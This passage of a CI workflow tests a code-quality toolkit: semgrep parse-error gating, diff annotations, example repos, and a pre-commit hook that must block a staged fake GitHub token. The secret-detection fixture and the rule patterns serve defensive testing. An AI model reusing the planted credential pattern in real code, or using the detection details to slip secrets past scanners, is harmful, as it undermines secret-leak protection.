            echo "::error::$1: expected '$3', got '$2'"; exit 1; }; echo "  OK  $1 = $2"; }
          eq gate     "$(sed -n 's/^semgrep_gate=//p' <<<"$out" | tail -1)" 1
          eq unparsed "$(sed -n 's/^semgrep_unparsed=//p' <<<"$out" | tail -1)" 1
          # Counting it is not enough — the file has to be NAMED, or the
          # coverage hole is still invisible to whoever reads the log.
          grep -q 'unparsed .*PrimaryConstructor\.cs' <<<"$out" || {
            echo '::error::the unparsed file was counted but never named'; exit 1; }
          grep -q 'file(s) UNPARSED' <<<"$out" || {
            echo '::error::the summary line does not carry the unparsed count'; exit 1; }
          echo 'OK: findings still gate; the coverage gap is named but does not gate'

      - name: ...but a tree semgrep cannot parse AT ALL is a failed scan
        shell: bash
        run: |
          set -uo pipefail
          rc=0
          out=$(./scripts/scan.sh samples/parse-errors/total \
                  --skip gitleaks --skip osv 2>&1) || rc=$?
          echo "$out"
          [[ "$rc" -ne 0 ]] || {
            echo '::error::a tree where NOTHING parsed reported success — "0 findings because nobody looked" must never read as clean'
            exit 1; }
          grep -q 'ERROR (policy exit 2)' <<<"$out" || {
            echo '::error::expected the semgrep summary line to be ERROR (policy exit 2)'
            exit 1; }
          grep -q 'failed to parse, so no rule ran' <<<"$out" || {
            echo '::error::the failure did not say WHY — it must name the cause, not just exit'
            exit 1; }
          echo 'OK: nothing-parsed is still a hard failure'

      # THE ALLOWLIST HAS TO BE AN ALLOWLIST. If the split ever became a
      # denylist — "everything is per-file except these" — a semgrep release
      # inventing a new failure mode would silently stop gating. Fed an error
      # type that is not on the list, classify must still exit 2.
      - name: An unrecognised semgrep error type is still fatal
        shell: bash
        run: |
          set -uo pipefail
          python3 scripts/policy.py resolve --target . --baseline . \
            --baseline-path . --out "$RUNNER_TEMP/p.json"
          cat > "$RUNNER_TEMP/invented.json" <<'JSON'
          {"results": [],
           "errors": [{"type": "SomeFutureSemgrepFailure",
                       "message": "invented for this test",
                       "path": "a.cs"}],
           "paths": {"scanned": ["a.cs"]}}
          JSON
          rc=0
          out=$(python3 scripts/policy.py classify --resolved "$RUNNER_TEMP/p.json" \
                  --results "$RUNNER_TEMP/invented.json" 2>&1) || rc=$?
          echo "$out"
          [[ "$rc" -eq 2 ]] || {
            echo "::error::an unknown error type exited $rc, not 2 — the parse-error split has become a denylist and a future semgrep failure would stop gating"
            exit 1; }
          echo 'OK: unknown error types are still fatal'

      # The standing report shares the split, by importing it rather than
      # reimplementing it. Before #43 one unparseable file rendered the whole
      # report as ERRORED and wrote ERRORED into the permanent history table.
      - name: The standing report shows the gap instead of blanking
        shell: bash
        run: |
          set -uo pipefail
          ./scripts/scan.sh samples/parse-errors/mixed --skip gitleaks --skip osv \
            --json-out "$RUNNER_TEMP/pe.json" >/dev/null 2>&1 || true
          rc=0
          out=$(python3 scripts/quality-report.py --json "$RUNNER_TEMP/pe.json" \
                  --date 2026-01-01 --target demo/repo \
                  --gitleaks clean --osv clean) || rc=$?
          echo "$out"
          [[ "$rc" -eq 0 ]] || {
            echo "::error::the report exited $rc — an unparseable file is still being treated as an outage"
            exit 1; }
          grep -q 'debug-print-left-behind-dotnet' <<<"$out" || {
            echo '::error::the findings breakdown is missing — the report blanked'; exit 1; }
          grep -q '### Not scanned' <<<"$out" || {
            echo '::error::the report does not mention the unparsed file at all, which is the other way to get this wrong'
            exit 1; }
          grep -q 'ERRORED' <<<"$out" && {
            echo '::error::the run was recorded as ERRORED in the history table'; exit 1; }
          echo 'OK: the report renders findings AND names the coverage gap'

      # --- #40: annotations render findings, they do not decide anything -----
      #
      # THE ASSERTION THAT MATTERS IS THE NEGATIVE ONE. An annotation layer that
      # can influence the exit code is a gate with a second, undocumented way to
      # go green. Everything below is arranged so that a rendering bug can only
      # produce a worse-looking run, never a passing one.
      - name: Annotations render on the diff, gating ones as errors
        shell: bash
        run: |
          set -uo pipefail
          out=$(./scripts/scan.sh samples/policy/warn --skip gitleaks --skip osv \
                  --annotate 2>&1) || true
          echo "$out"
          # A warn-only rule must annotate as ::warning, not ::error — the
          # policy's downgrade has to survive into the rendering, or the diff
          # shows a red mark for something the gate deliberately let through.
          grep -qE '^::warning file=.*title=todo-without-issue::' <<<"$out" || {
            echo '::error::the warn-only finding did not annotate as ::warning'
            exit 1; }
          grep -qE '^::error ' <<<"$out" && {
            echo '::error::a warn-only fixture emitted an ::error annotation'
            exit 1; }
          # And the gating direction, on a fixture that actually gates.
          out=$(./scripts/scan.sh samples/policy/disable --skip gitleaks --skip osv \
                  --annotate 2>&1) || true
          grep -qE '^::error file=.*line=[0-9]+.*title=' <<<"$out" || {
            echo '::error::a gating finding did not annotate as ::error with a file and line'
            exit 1; }
          echo 'OK: gating findings annotate as errors, warn-only as warnings'

      - name: A broken annotation path cannot make a failing scan pass
        shell: bash
        run: |
          set -uo pipefail
          # 1. The cap set to zero — the most direct form of "the renderer
          #    produced nothing". The verdict must be identical.
          rc_plain=0
          ./scripts/scan.sh samples/policy/disable --skip gitleaks --skip osv \
            >/dev/null 2>&1 || rc_plain=$?
          rc_zero=0
          out=$(./scripts/scan.sh samples/policy/disable --skip gitleaks --skip osv \
                  --annotate --max-annotations 0 2>&1) || rc_zero=$?
          echo "$out"
          [[ "$rc_plain" -eq 1 && "$rc_zero" -eq 1 ]] || {
            echo "::error::exit code changed with annotations: plain=$rc_plain annotated-cap-0=$rc_zero"
            exit 1; }
          grep -q 'suppressed' <<<"$out" || {
            echo '::error::annotations were suppressed silently — the count must be stated'
            exit 1; }

          # 2. MALFORMED FINDINGS. A result with no path, no start and no extra
          #    is what a semgrep output-format change looks like from here. The
          #    annotator must degrade, not raise — a traceback would take the
          #    verdict down with it.
          python3 scripts/policy.py resolve --target . --baseline . \
            --baseline-path . --out "$RUNNER_TEMP/p.json"
          cat > "$RUNNER_TEMP/malformed.json" <<'JSON'
          {"results": [{"check_id": "semgrep.general.no-ambient-clock"},
                       {"check_id": "x.weak-crypto", "path": "a.ts", "start": "nonsense"}],
           "errors": [], "paths": {"scanned": ["a.ts"]}}
          JSON
          rc=0
          out=$(python3 scripts/policy.py classify --resolved "$RUNNER_TEMP/p.json" \
                  --results "$RUNNER_TEMP/malformed.json" --annotate 2>&1) || rc=$?
          echo "$out"
          [[ "$rc" -eq 1 ]] || {
            echo "::error::malformed findings changed the verdict (exit $rc, expected 1) — the annotator is not isolated from it"
            exit 1; }
          grep -q 'semgrep_gate=2' <<<"$out" || {
            echo '::error::the gate count did not survive the malformed results'
            exit 1; }
          echo 'OK: annotations are additive — cap, suppression and malformed input all leave the verdict alone'

      # --- #40: the opt-in pre-commit hook -----------------------------------
      #
      # Driven through a real `git commit` in a scratch repo rather than by
      # calling the script. A hook has two failure modes a direct invocation
      # cannot see: git runs it with its own environment, and the thing it is
      # supposed to scan is the INDEX, not the working tree.
      - name: The pre-commit hook is opt-in, blocks staged secrets, and is bypassable
        shell: bash
        run: |
          set -uo pipefail
          R="$RUNNER_TEMP/hookrepo"; rm -rf "$R"; mkdir -p "$R/src"
          git -C "$R" init -q .
          git -C "$R" config user.name t
          git -C "$R" config user.email t@example.invalid
          echo '{}' > "$R/package.json"; echo '{}' > "$R/package-lock.json"

          # OPT-IN: adoption without --hooks must install nothing. A hook that
          # arrives unasked is one people delete along with everything near it.
          ./scripts/adopt.sh "$R" --no-workflow >/dev/null 2>&1
          [[ ! -e "$R/.git/hooks/pre-commit" ]] || {
            echo '::error::adopt.sh installed a pre-commit hook WITHOUT --hooks'
            exit 1; }

          ./scripts/adopt.sh "$R" --no-workflow --hooks >/dev/null 2>&1
          [[ -x "$R/.git/hooks/pre-commit" ]] || {
            echo '::error::--hooks did not install an executable pre-commit hook'; exit 1; }

          echo 'export const ok = 1;' > "$R/src/ok.ts"
          git -C "$R" add -A
          rc=0; git -C "$R" commit -qm base >/dev/null 2>&1 || rc=$?
          [[ "$rc" -eq 0 ]] || {
            echo "::error::the hook blocked a clean commit (exit $rc)"
            git -C "$R" commit -m base 2>&1 | tail -20; exit 1; }
          BASE=$(git -C "$R" rev-parse HEAD)

          # THE INDEX, NOT THE WORKING TREE. The secret is staged and then
          # overwritten on disk. `git commit` commits the index, so a hook that
          # scans the working tree sees clean code and waves through the very
          # commit it exists to stop. This is the single most common way a
          # pre-commit hook is quietly wrong.
          #
          # The variable is named `apiToken` on purpose. hardcoded-secret-ts
          # matches on the NAME (`metavariable-regex` over password|token|…),
          # so a fixture called `t` trips gitleaks and NOT semgrep — which is
          # how the first version of this test passed on a laptop with gitleaks
          # installed and failed on a runner that only has semgrep. A fixture
          # whose verdict depends on which tool happens to be present is not a
          # test of the hook.
          printf "export const apiToken = 'ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8';\n" \
            > "$R/src/leak.ts"
          git -C "$R" add src/leak.ts
          echo 'export const clean = 1;' > "$R/src/leak.ts"
          rc=0
          out=$(git -C "$R" commit -qm leak 2>&1) || rc=$?
          echo "$out"
          [[ "$rc" -ne 0 ]] || {
            echo '::error::a STAGED secret was committed — the hook is scanning the working tree instead of the index'
            exit 1; }
          [[ "$(git -C "$R" rev-parse HEAD)" == "$BASE" ]] || {
            echo '::error::the commit landed anyway'; exit 1; }

          # WHICH HALF BLOCKED IT, not just that something did. A bare "the
          # commit failed" would stay green if the Semgrep pass silently
          # stopped running and gitleaks alone carried it — the same
          # passes-without-checking shape this whole job exists to catch.
          grep -q 'Semgrep findings in the staged changes' <<<"$out" || {
            echo '::error::the commit was blocked, but NOT by the Semgrep pass — it is not running against the staged content'
            exit 1; }
          # And the gitleaks half, in whichever state this machine is in. The
          # skip path is asserted too: failing soft on a missing tool is
          # deliberate, but it has to be VISIBLE or the hook is quietly doing
          # half its job.
          if command -v gitleaks >/dev/null 2>&1; then
            grep -q 'gitleaks found a secret' <<<"$out" || {
              echo '::error::gitleaks is installed but did not flag a staged credential'
              exit 1; }
          else
            grep -q 'gitleaks not installed' <<<"$out" || {
              echo '::error::gitleaks is absent and the hook said nothing about it — a skipped check must never be silent'
              exit 1; }
            # SAID OUT LOUD, because this is the branch CI actually takes: this
            # job installs semgrep and not gitleaks, so the hook's `gitleaks
            # git --staged` invocation is exercised on a laptop and NOT here.
            # Installing gitleaks would mean a third place pinning its version
            # and sha256, which is the problem #43 just finished removing for
            # semgrep. What IS covered on a runner: gitleaks itself, through
            # actions/layer2 in the layer2 job.
            echo 'NOTE: gitleaks absent here — the hook fell through to Semgrep, and the fall-through was visible. The gitleaks invocation itself is only exercised where gitleaks is installed.'
          fi

          # BYPASSABLE. This is a feature, not a hole: a hook that cannot be
          # skipped gets uninstalled the first time somebody needs to commit a
          # WIP, and then it catches nothing at all.
          rc=0; git -C "$R" commit -qm leak --no-verify >/dev/null 2>&1 || rc=$?
          [[ "$rc" -eq 0 ]] || {
            echo '::error::--no-verify did not bypass the hook'; exit 1; }

          # AND THE OTHER DIRECTION: a secret that is only in the working tree
          # is not being committed, so it must not block. A hook that fires on
          # unstaged edits is one people disable.
          git -C "$R" reset -q --hard "$BASE"
          printf "export const t = 'ghp_A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8';\n" > "$R/src/leak.ts"
          echo 'export const other = 2;' > "$R/src/other.ts"
          git -C "$R" add src/other.ts
          rc=0; git -C "$R" commit -qm other >/dev/null 2>&1 || rc=$?
          [[ "$rc" -eq 0 ]] || {
            echo '::error::an UNSTAGED secret blocked the commit — the hook is scanning the working tree'
            exit 1; }
          echo 'OK: opt-in, index-scoped in both directions, and bypassable'

      # A hook is the one script in this repo most likely to run on a
      # developer's Mac, where /bin/bash is still 3.2.57. It shipped with
      # `mapfile` — a bash 4 builtin — and aborted every commit with "command
      # not found" until this was caught by running it rather than reading it.
      - name: The hook must run under bash 3.2
        shell: bash
        run: |
          set -Eeuo pipefail
          # COMMENTS ARE STRIPPED FIRST. The hook documents the bug it shipped
          # with, by name — so a guard reading the raw file fails on the
          # explanation of why the guard exists. Exactly the shape the
          # fetch-and-execute guard already had to be taught (STATUS §4).
          sed 's/[[:space:]]*#.*$//' hooks/pre-commit > "$RUNNER_TEMP/hook.stripped"
          # `mapfile`/`readarray`, associative arrays and `${var^^}` are the
          # bash 4 constructs that would silently reintroduce this.
          if grep -nE '\b(mapfile|readarray)\b|declare -A|\$\{[A-Za-z_]+\^\^' \
               "$RUNNER_TEMP/hook.stripped"; then
            echo '::error::hooks/pre-commit uses a bash 4 construct; macOS ships bash 3.2.57'
            exit 1
          fi
          bash -n hooks/pre-commit
          echo 'OK: no bash 4 constructs in the hook'

  # examples/ is documentation that executes. A worked example that would not
  # actually work is worse than no example — the reader trusts it more than the
  # prose, and finds out in their own CI. So each one is asserted here:
  # detected as the language it claims, clean under Layer 2, and — where it
  # carries a policy file — the policy has to genuinely resolve.
  #
  # Note what this does NOT do: build or lint the examples. `adopt` already
  # proves end-to-end that a repo adopted by the script behaves exactly like the
  # hand-configured sample, in both directions. Repeating that per example would
  # assert the same thing five more times and slowly.
  examples:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: Install semgrep and PyYAML
        shell: bash
        run: |
          set -Eeuo pipefail
          pipx install semgrep==1.172.0
          python3 -c 'import yaml' 2>/dev/null \
            || python3 -m pip install --quiet --break-system-packages 'pyyaml==6.0.3'
          python3 -c 'import yaml'

      - name: Every example is detected as the language it claims
        shell: bash
        run: |
          set -Eeuo pipefail
          expect() {
            dir="examples/$1"; shift
            out=$(./scripts/adopt.sh "$dir" --dry-run 2>&1)
            for lang in "$@"; do
              grep -qF "detected: $lang" <<<"$out" || {
                echo "::error::$dir was not detected as $lang"
                echo "$out"; exit 1; }
            done
            echo "  OK  $dir → $*"
          }
          expect typescript-npm  'TypeScript'
          expect dotnet          'C#/.NET'
          expect python-uv       'Python'
          expect rust-cli        'Rust'
          expect java-maven      'Java (Maven)'
          expect mixed-monorepo  'TypeScript' 'C#/.NET'
          expect legacy-ratchet  'TypeScript'

      - name: Every example scans CLEAN
        shell: bash
        run: |
          set -Eeuo pipefail
          # An example carrying a violation teaches the violation. The scan runs
          # per example so a failure names which one, and with each example's
          # OWN policy file in effect — the mixed-monorepo one disables a rule,
          # and a run that ignored it would be testing a different repo than the
          # one the reader copies.
          fail=0
          for d in examples/*/; do
            [[ -f "$d/README.md" ]] || continue
            rc=0
            out=$(./scripts/scan.sh "$d" --skip gitleaks --skip osv 2>&1) || rc=$?
            if [[ "$rc" -ne 0 ]]; then
              echo "::error::$d does not scan clean (exit $rc)"
              echo "$out" | tail -40
              fail=1
            else
              echo "  OK  $d clean"
            fi
          done
          [[ "$fail" -eq 0 ]]

      - name: Every documented policy file actually resolves
        shell: bash
        run: |
          set -Eeuo pipefail
          # The failure this catches: a policy snippet in the docs that would be
          # rejected by scripts/policy.py. Unknown keys are hard errors, so a
          # stale example is a consumer whose first run after copying it exits 3.
          n=0
          for f in examples/*/.maxi-quality.yml; do
            d=$(dirname "$f")
            python3 scripts/policy.py resolve --target "$d" --baseline . \
              --baseline-path . >/dev/null || {
                echo "::error::$f does not resolve"; exit 1; }
            echo "  OK  $f resolves"
            n=$((n + 1))
          done
          # A loop over zero files passes trivially. There must BE examples with
          # policy files, or this step is asserting nothing at all.
          [[ "$n" -ge 2 ]] || {
            echo "::error::expected at least 2 examples carrying a policy file, found $n"
            exit 1; }

      - name: Every example workflow pins this repo, and the ratchet keeps its ratchet
        shell: bash
        run: |
          set -Eeuo pipefail
          for f in examples/*/.github/workflows/quality.yml; do
            python3 -c "import sys, yaml; yaml.safe_load(open(sys.argv[1]))" "$f"
            grep -qF 'maximalcode/maxi-quality/.github/workflows/quality.yml@' "$f" || {
              echo "::error::$f does not call this repo's reusable workflow"; exit 1; }
            echo "  OK  $f"
          done
          # The one example whose entire reason for existing is that line.
          grep -qF 'changed-only:' examples/legacy-ratchet/.github/workflows/quality.yml || {
            echo '::error::legacy-ratchet lost its changed-only — it is the whole point of that example'
            exit 1; }
          echo 'OK: every example workflow is valid and pinned'

      # #97. The gate defaults to 'auto', which WARNS when the tool is absent —
      # so an example that merely omits the input would document a repo where
      # the dead-code gate quietly does nothing, which is the state this issue
      # exists to end. The two fully-adopted examples show the finished shape:
      # the tool declared as a dev dependency AND the mode raised to require.
      - name: The adopted examples must actually gate dead code
        shell: bash
        run: |
          set -Eeuo pipefail
          need() {
            grep -qF "$2" "$1" || {
              echo "::error::$1 no longer contains '$2' — see #97"; exit 1; }
          }
          # TypeScript: the tool, the config it cannot work without, and the mode.
          need examples/typescript-npm/package.json '"knip"'
          need examples/typescript-npm/knip.json '"entry"'
          need examples/typescript-npm/.github/workflows/quality.yml 'dead-code: require'
          # ...and the exports switch, which is the application-vs-library call.
          need examples/typescript-npm/.github/workflows/quality.yml 'dead-code-exports: true'
          # A knip config with no entry points is a zero-config run wearing a
          # config file: it reports the layout rather than the defects.
          python3 -c '
          import json, sys
          entry = json.load(open("examples/typescript-npm/knip.json")).get("entry") or []
          if not entry:
              sys.exit("::error::examples/typescript-npm/knip.json declares no entry points")
          print(f"  OK  knip.json declares {len(entry)} entry point(s)")
          '
          # Python: deptry as a dev dependency, and the mode.
          need examples/python-uv/pyproject.toml 'deptry'
          need examples/python-uv/.github/workflows/quality.yml 'dead-code: require'
          echo 'OK: both adopted examples declare the tool and require the gate'

      # #75's last acceptance box: "an example under examples/ that CI asserts."
      # The gate itself is tested to death in coverage-ratchet, coverage-action,
      # patch-coverage and coverage-input — what none of those can test is the
      # thing a consumer actually gets wrong, because it lives in THEIR file:
      # the artifact hand-off, which is two names that have to match and one
      # `needs:` edge with no other reason to exist.
      #
      # Structural, not executed. This repo cannot run a green `quality.yml`
      # against its own tree — `samples/` is deliberately broken, so Layer 2
      # fails by design, and `continue-on-error` is not accepted on a
      # reusable-workflow call. So the example is asserted the way a reviewer
      # would read it, which is also how a reader copies it.
      - name: The coverage example wires the artifact hand-off end to end
        shell: bash
        run: |
          set -Eeuo pipefail
          python3 - <<'PY'
          import pathlib, sys, yaml

          BASE = yaml.safe_load(
              pathlib.Path(".github/workflows/quality.yml").read_text())
          KNOWN = set(BASE[True]["workflow_call"]["inputs"])

          bad = []
          wired = []
          for path in sorted(pathlib.Path("examples").glob(
                  "*/.github/workflows/quality.yml")):
              doc = yaml.safe_load(path.read_text())
              jobs = doc["jobs"]

              # Every input an example sets must still EXIST. An example is
              # documentation people copy, so a renamed input here is a
              # consumer's first run exiting on an unknown key.
              for job in jobs.values():
                  for key in (job.get("with") or {}):
                      if key not in KNOWN:
                          bad.append(f"{path}: sets '{key}', which quality.yml "
                                     "has no input for")

              for name, job in jobs.items():
                  artifact = (job.get("with") or {}).get("coverage-report")
                  if not artifact:
                      continue
                  wired.append(path)

                  # The `needs:` edge. Without it the gate can start before the
                  # upload finishes and fails on a missing artifact — the wrong
                  # error, for the right reason, and the reader blames coverage.
                  needs = job.get("needs") or []
                  needs = [needs] if isinstance(needs, str) else needs
                  if not needs:
                      bad.append(f"{path}: job '{name}' sets coverage-report "
                                 "with no `needs:` — the artifact may not exist "
                                 "yet when it runs")

                  # ...and the edge has to point at the job that actually
                  # uploads THAT artifact name. Two names matching by luck is
                  # the failure this catches.
                  uploaders = {
                      dep for dep in needs
                      for step in (jobs.get(dep) or {}).get("steps", [])
                      if str(step.get("uses", "")).startswith(
                          "actions/upload-artifact@")
                      and (step.get("with") or {}).get("name") == artifact
                  }
                  if not uploaders:
                      bad.append(
                          f"{path}: job '{name}' waits on {needs or 'nothing'}, "
                          f"none of which uploads an artifact named "
                          f"'{artifact}'")

                  # The bootstrap. A copied example whose first run fails on a
                  # missing floor, with nothing in the file saying that is
                  # expected, reads as a broken baseline.
                  if "coverage-raise" not in path.read_text():
                      bad.append(f"{path}: wires coverage but never mentions "
                                 "coverage-raise — a reader's first run fails "
                                 "on the missing floor with no way out")

          if not wired:
              bad.append("no example wires coverage-report — this guard "
                         "stopped guarding (#75)")

          for line in bad:
              print(f"::error::{line}")
          if not bad:
              print(f"OK: {len(wired)} coverage example(s), artifact hand-off "
                    "and bootstrap intact; every example input still exists")
          sys.exit(1 if bad else 0)
          PY

      # examples/README.md is the index a reader lands on, and it drifted:
      # java-maven shipped, CI asserted it, and the table never gained a row —
      # so the one example for the newest language was invisible to anyone not
      # running `ls`.
      - name: Every example appears in the examples index
        shell: bash
        run: |
          set -Eeuo pipefail
          index=$(cat examples/README.md)
          n=0
          for d in examples/*/; do
            [[ -f "$d/README.md" ]] || continue
            name=$(basename "$d")
            grep -qF "\`$name/\`" <<<"$index" || {
              echo "::error::examples/$name is asserted by CI and has no row in examples/README.md"
              exit 1; }
            n=$((n + 1))
          done
          # ...and the prose count has to be right too, in both places that
          # state one. "Seven complete consumer repos" above a table of six is
          # how the java-maven row went missing without anything going red.
          words=(zero one two three four five six seven eight nine ten)
          word="${words[$n]:-$n}"
          for f in README.md examples/README.md; do
            grep -qiF "$word complete consumer repos" "$f" || {
              echo "::error::$f does not say '$word complete consumer repos', and there are $n"
              exit 1; }
          done
          [[ "$n" -ge 5 ]] || {
            echo "::error::found only $n examples — this guard stopped guarding"; exit 1; }
          echo "OK: all $n examples appear in examples/README.md, and both indexes say $word"
